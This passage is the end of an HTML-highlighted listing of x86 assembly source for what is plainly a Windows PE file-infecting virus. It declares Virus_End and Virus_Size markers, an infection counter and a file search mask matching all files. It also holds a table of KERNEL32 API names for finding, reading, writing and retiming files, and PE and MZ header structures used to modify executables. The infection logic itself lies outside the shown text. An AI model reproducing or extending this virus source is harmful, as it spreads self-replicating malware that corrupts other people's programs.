                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">Upcase_AL</span><span class="sc0">

                </span><span class="sc6">ROL</span><span class="sc0">     </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0">
                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">Upcase_AL</span><span class="sc0">

                </span><span class="sc6">ROL</span><span class="sc0">     </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0">
                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">Upcase_AL</span><span class="sc0">

                </span><span class="sc6">ROL</span><span class="sc0">     </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0">

</span><span class="sc5">Upcase_AL</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc6">CMP</span><span class="sc0">     </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'a'</span><span class="sc0">
                </span><span class="sc6">JB</span><span class="sc0">      </span><span class="sc5">Exit_Upcase_AL</span><span class="sc0">

                </span><span class="sc6">CMP</span><span class="sc0">     </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'z'</span><span class="sc0">
                </span><span class="sc6">JA</span><span class="sc0">      </span><span class="sc5">Exit_Upcase_AL</span><span class="sc0">

                </span><span class="sc6">SUB</span><span class="sc0">     </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'a'</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc12">'A'</span><span class="sc0">

</span><span class="sc5">Exit_Upcase_AL</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">RET</span><span class="sc0">


</span><span class="sc9">IF</span><span class="sc0">              </span><span class="sc5">Debug_Mode</span><span class="sc0">

</span><span class="sc5">Search_Mask</span><span class="sc0">     </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc12">'DUM?.*'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc9">ELSE</span><span class="sc0">

</span><span class="sc5">Search_Mask</span><span class="sc0">     </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc12">'*.*'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc9">ENDIF</span><span class="sc0">


</span><span class="sc5">API_Names</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc12">'KERNEL32'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc12">'K'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'E'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'R'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'N'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'E'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'L'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'3'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'2'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc12">'CreateFileA'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc12">'CloseHandle'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc12">'SetFilePointer'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc12">'ReadFile'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc12">'WriteFile'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc12">'GetFileSize'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc12">'FindFirstFileA'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc12">'FindNextFileA'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc12">'FindClose'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc12">'GetFileTime'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc12">'SetFileTime'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc12">'GetFileAttributesA'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc12">'SetFileAttributesA'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc12">'GetLocalTime'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc12">'SetEndOfFile'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc12">'GetCurrentDirectoryA'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc12">'SetCurrentDirectoryA'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc12">'GetWindowsDirectoryA'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc12">'GetSystemDirectoryA'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc12">'GetTickCount'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">

                </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc12">'USER32'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc12">'U'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'S'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'E'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'R'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'3'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'2'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">

                </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc12">'MessageBoxA'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">Zero_Tolerance</span><span class="sc0">  </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">


</span><span class="sc5">Name_GetProcAddress</span><span class="sc0">     </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc12">'GetProcAddress'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">Name_GetModuleHandleX</span><span class="sc0">   </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc12">'GetModuleHandle'</span><span class="sc0">


</span><span class="sc9">IF</span><span class="sc0">              </span><span class="sc4">((</span><span class="sc10">$</span><span class="sc4">-</span><span class="sc5">START</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc9">MOD</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc9">GT</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc4">(</span><span class="sc2">4</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc4">((</span><span class="sc10">$</span><span class="sc4">-</span><span class="sc5">START</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc9">MOD</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc4">))</span><span class="sc0"> </span><span class="sc9">DUP</span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc9">ENDIF</span><span class="sc0">

</span><span class="sc5">Virus_End</span><span class="sc4">:</span><span class="sc0">


</span><span class="sc5">API_Addresses</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc1">; === API's from KERNEL32.DLL. ===</span><span class="sc0">

</span><span class="sc5">CreateFileA</span><span class="sc0">             </span><span class="sc9">DD</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">CloseHandle</span><span class="sc0">             </span><span class="sc9">DD</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">SetFilePointer</span><span class="sc0">          </span><span class="sc9">DD</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">ReadFile</span><span class="sc0">                </span><span class="sc9">DD</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">WriteFile</span><span class="sc0">               </span><span class="sc9">DD</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">GetFileSize</span><span class="sc0">             </span><span class="sc9">DD</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">FindFirstFileA</span><span class="sc0">          </span><span class="sc9">DD</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">FindNextFileA</span><span class="sc0">           </span><span class="sc9">DD</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">FindClose</span><span class="sc0">               </span><span class="sc9">DD</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">GetFileTime</span><span class="sc0">             </span><span class="sc9">DD</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">SetFileTime</span><span class="sc0">             </span><span class="sc9">DD</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">GetFileAttributesA</span><span class="sc0">      </span><span class="sc9">DD</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">SetFileAttributesA</span><span class="sc0">      </span><span class="sc9">DD</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">GetLocalTime</span><span class="sc0">            </span><span class="sc9">DD</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">SetEndOfFile</span><span class="sc0">            </span><span class="sc9">DD</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">GetCurrentDirectoryA</span><span class="sc0">    </span><span class="sc9">DD</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">SetCurrentDirectoryA</span><span class="sc0">    </span><span class="sc9">DD</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">GetWindowsDirectoryA</span><span class="sc0">    </span><span class="sc9">DD</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">GetSystemDirectoryA</span><span class="sc0">     </span><span class="sc9">DD</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">GetTickCount</span><span class="sc0">            </span><span class="sc9">DD</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc1">; === API's from USER32.DLL. ===</span><span class="sc0">

</span><span class="sc5">MessageBoxA</span><span class="sc0">             </span><span class="sc9">DD</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">


</span><span class="sc5">GetModuleHandleX</span><span class="sc0">        </span><span class="sc9">DD</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">               </span><span class="sc1">; These are being fetched</span><span class="sc0">
</span><span class="sc5">GetProcAddressX</span><span class="sc0">         </span><span class="sc9">DD</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">               </span><span class="sc1">; from the host's import.</span><span class="sc0">

</span><span class="sc5">Local_Time</span><span class="sc0">              </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc2">8</span><span class="sc0"> </span><span class="sc9">DUP</span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0">

</span><span class="sc5">Time_Creation</span><span class="sc0">           </span><span class="sc9">DD</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">Time_Last_Access</span><span class="sc0">        </span><span class="sc9">DD</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">Time_Last_Write</span><span class="sc0">         </span><span class="sc9">DD</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">Infect_Counter</span><span class="sc0">          </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">Bytes_Read</span><span class="sc0">              </span><span class="sc9">DD</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">Header</span><span class="sc0">                  </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc2">92</span><span class="sc0"> </span><span class="sc9">DUP</span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">Last_Section_Header</span><span class="sc0">     </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc2">40</span><span class="sc0"> </span><span class="sc9">DUP</span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">Search_Record</span><span class="sc0">           </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc2">318</span><span class="sc0"> </span><span class="sc9">DUP</span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0">

</span><span class="sc5">Current_Directory</span><span class="sc0">       </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc2">260</span><span class="sc0"> </span><span class="sc9">DUP</span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">Windows_Directory</span><span class="sc0">       </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc2">260</span><span class="sc0"> </span><span class="sc9">DUP</span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">System_Directory</span><span class="sc0">        </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc2">260</span><span class="sc0"> </span><span class="sc9">DUP</span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0">

</span><span class="sc5">Buffer</span><span class="sc0">                  </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc5">Virus_Size</span><span class="sc0"> </span><span class="sc9">DUP</span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0">

</span><span class="sc5">Virus_End_Mem</span><span class="sc4">:</span><span class="sc0">


</span><span class="sc5">Carrier</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">                       </span><span class="sc1">; Terminate current process.</span><span class="sc0">
                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">ExitProcess</span><span class="sc0">


</span><span class="sc1">;---------------------- SOME USED STRUCTURES --------------------------------</span><span class="sc0">


</span><span class="sc5">EXE_Header</span><span class="sc0">      </span><span class="sc9">STRUC</span><span class="sc0">
</span><span class="sc5">EXE_Mark</span><span class="sc0">        </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">                       </span><span class="sc1">; MZ-marker (MZ or ZM).</span><span class="sc0">
</span><span class="sc5">Image_Mod_512</span><span class="sc0">   </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">Image_512_Pages</span><span class="sc0"> </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">Reloc_Items</span><span class="sc0">     </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">Header_Size_Mem</span><span class="sc0"> </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">Min_Size_Mem</span><span class="sc0">    </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">Max_Size_Mem</span><span class="sc0">    </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">Program_SS</span><span class="sc0">      </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">Program_SP</span><span class="sc0">      </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">MZ_Checksum</span><span class="sc0">     </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">Program_IP</span><span class="sc0">      </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">Program_CS</span><span class="sc0">      </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">Reloc_Table</span><span class="sc0">     </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">EXE_Header</span><span class="sc0">      </span><span class="sc9">ENDS</span><span class="sc0">


</span><span class="sc5">PE_Header</span><span class="sc0">               </span><span class="sc9">STRUC</span><span class="sc0">
</span><span class="sc5">PE_Mark</span><span class="sc0">                 </span><span class="sc9">DD</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">               </span><span class="sc1">; PE-marker (PE/0/0).</span><span class="sc0">
</span><span class="sc5">CPU_Type</span><span class="sc0">                </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">               </span><span class="sc1">; Minimal CPU required.</span><span class="sc0">
</span><span class="sc5">Number_Of_Sections</span><span class="sc0">      </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">               </span><span class="sc1">; Number of sections in PE.</span><span class="sc0">
                        </span><span class="sc9">DD</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">Reserved_1</span><span class="sc0">              </span><span class="sc9">DD</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
                        </span><span class="sc9">DD</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">NT_Header_Size</span><span class="sc0">          </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">PE_Flags</span><span class="sc0">                </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
                        </span><span class="sc9">DD</span><span class="sc0">      </span><span class="sc2">4</span><span class="sc0"> </span><span class="sc9">DUP</span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">EIP_RVA</span><span class="sc0">                 </span><span class="sc9">DD</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
                        </span><span class="sc9">DD</span><span class="sc0">      </span><span class="sc2">2</span><span class="sc0"> </span><span class="sc9">DUP</span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">Image_Base</span><span class="sc0">              </span><span class="sc9">DD</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">Object_Align</span><span class="sc0">            </span><span class="sc9">DD</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">File_Align</span><span class="sc0">              </span><span class="sc9">DD</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
                        </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
                        </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
                        </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
                        </span><span class="sc9">DD</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">Image_Size</span><span class="sc0">              </span><span class="sc9">DD</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
                        </span><span class="sc9">DD</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">Checksum</span><span class="sc0">                </span><span class="sc9">DD</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">PE_Header</span><span class="sc0">               </span><span class="sc9">ENDS</span><span class="sc0">


</span><span class="sc5">Section_Header</span><span class="sc0">          </span><span class="sc9">STRUC</span><span class="sc0">
</span><span class="sc5">Section_Name</span><span class="sc0">            </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc2">8</span><span class="sc0"> </span><span class="sc9">DUP</span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0">        </span><span class="sc1">; Zero-padded section-name.</span><span class="sc0">
</span><span class="sc5">Section_Virtual_Size</span><span class="sc0">    </span><span class="sc9">DD</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">               </span><span class="sc1">; Memory-size of section.</span><span class="sc0">
</span><span class="sc5">Section_RVA</span><span class="sc0">             </span><span class="sc9">DD</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">               </span><span class="sc1">; Start section in memory.</span><span class="sc0">
</span><span class="sc5">Section_Physical_Size</span><span class="sc0">   </span><span class="sc9">DD</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">               </span><span class="sc1">; Section-size in file.</span><span class="sc0">
</span><span class="sc5">Section_Physical_Offset</span><span class="sc0"> </span><span class="sc9">DD</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">               </span><span class="sc1">; Section file-offset.</span><span class="sc0">
</span><span class="sc5">Section_Reserved_1</span><span class="sc0">      </span><span class="sc9">DD</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">               </span><span class="sc1">; Not used for executables.</span><span class="sc0">
</span><span class="sc5">Section_Reserved_2</span><span class="sc0">      </span><span class="sc9">DD</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">               </span><span class="sc1">; Not used for executables.</span><span class="sc0">
</span><span class="sc5">Section_Reserved_3</span><span class="sc0">      </span><span class="sc9">DD</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">               </span><span class="sc1">; Not used for executables.</span><span class="sc0">
</span><span class="sc5">Section_Flags</span><span class="sc0">           </span><span class="sc9">DD</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">               </span><span class="sc1">; Flags of the section.</span><span class="sc0">
</span><span class="sc5">Section_Header</span><span class="sc0">          </span><span class="sc9">ENDS</span><span class="sc0">


</span><span class="sc5">Find_First_Next_Win32</span><span class="sc0">   </span><span class="sc9">STRUC</span><span class="sc0">
</span><span class="sc5">File_Attributes</span><span class="sc0">         </span><span class="sc9">DD</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">Creation_Time</span><span class="sc0">           </span><span class="sc9">DD</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">Last_Accessed_Time</span><span class="sc0">      </span><span class="sc9">DD</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">Last_Written_Time</span><span class="sc0">       </span><span class="sc9">DD</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">Find_File_Size_High</span><span class="sc0">     </span><span class="sc9">DD</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">Find_File_Size_Low</span><span class="sc0">      </span><span class="sc9">DD</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">Find_Reserved_1</span><span class="sc0">         </span><span class="sc9">DD</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">Find_Reserved_2</span><span class="sc0">         </span><span class="sc9">DD</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">Find_File_Name</span><span class="sc0">          </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc2">260</span><span class="sc0"> </span><span class="sc9">DUP</span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">Find_DOS_File_Name</span><span class="sc0">      </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc2">14</span><span class="sc0"> </span><span class="sc9">DUP</span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">Find_First_Next_Win32</span><span class="sc0">   </span><span class="sc9">ENDS</span><span class="sc0">


</span><span class="sc5">Date_Time</span><span class="sc0">               </span><span class="sc9">STRUC</span><span class="sc0">
</span><span class="sc5">Current_Year</span><span class="sc0">            </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">Current_Month</span><span class="sc0">           </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">Current_Day_Of_Week</span><span class="sc0">     </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">Current_Day</span><span class="sc0">             </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">Current_Hour</span><span class="sc0">            </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">Current_Minute</span><span class="sc0">          </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">Current_Second</span><span class="sc0">          </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">Current_Millisecond</span><span class="sc0">     </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">Date_Time</span><span class="sc0">               </span><span class="sc9">ENDS</span><span class="sc0">

                </span><span class="sc9">END</span><span class="sc0">     </span><span class="sc5">START</span><span class="sc0">
</span></div></body>
</html>
